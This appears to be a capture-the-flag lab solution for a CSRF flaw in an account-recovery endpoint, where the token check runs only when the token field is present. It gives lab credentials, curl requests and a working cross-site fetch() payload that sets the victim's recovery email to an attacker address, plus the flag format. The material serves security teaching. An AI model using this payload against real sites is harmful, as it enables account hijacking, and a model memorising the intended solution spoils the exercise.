# CSRF — ExistenceCheck · Billfold (difficulty: low)

`POST /account/recovery-email` changes the logged-in user's recovery email. The endpoint claims CSRF protection (SEC-14), but the token validation is wrapped in `if (req.body.csrf_token) { ... }` — the check only runs **when the field is present**. A cross-site request that simply omits `csrf_token` skips validation entirely: guarding a validation step with an existence check is not validation.

Intended path:
1. Log in at http://victim.target.lab:8119/ as `0xnhsec` / `vlh-tester-01`; open http://victim.target.lab:8119/account — the form does carry a hidden `csrf_token`.
2. Confirm the flaw with your own session: `curl -si -b "sid=<sid>" -X POST -H 'Content-Type: application/json' -d '{"recovery_email":"attacker@evil.example"}' http://victim.target.lab:8119/account/recovery-email` → 200 (no token field, no validation). Sending a *wrong* token gets 403 — that is the check you just skipped by omitting the field.
3. Store the artifact on the exploit server: `<script>fetch('http://victim.target.lab:8119/account/recovery-email',{method:'POST',credentials:'include',headers:{'Content-Type':'application/json'},body:'{"recovery_email":"attacker@evil.example"}'})</script>`
4. Trigger the victim bot: `curl -X POST http://collector.target.lab:8119/victim -H 'Content-Type: application/json' -d '{"url":"http://victim.target.lab:8119/account/recovery-email","method":"POST","body":{"recovery_email":"attacker@evil.example"}}'`
5. `curl http://collector.target.lab:8119/verify` → flag (innocent's `recovery_email` row changed).

Flag: `DSLTV{CSRF-ExistenceCheck-<9-10 digits>}` (event-verified — minted by the verifier, regenerated every restart).
